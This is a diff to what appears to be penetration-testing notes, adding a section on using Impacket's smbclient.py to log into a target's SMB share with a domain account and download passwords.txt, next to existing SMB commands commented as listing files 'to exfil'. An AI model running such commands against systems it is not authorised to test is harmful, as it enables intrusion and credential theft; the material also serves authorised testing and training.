@@ -11,3 +11,15 @@ dir                      # list files to exfil
 mget passwords.txt       # download a file
 exit
 ```
+
+## Impacket
+### smbclient.py
+`smbclient.py` also connects to SMB ports on the target. 
+```bash
+# attacker Terminal 1:
+# use this syntax to specify a domain account: "domain/username"
+smbclient.py evilcorp/john@target # invoke a semi-interactive shell
+use restrictedfolder 
+get passwords.txt
+exit
+```
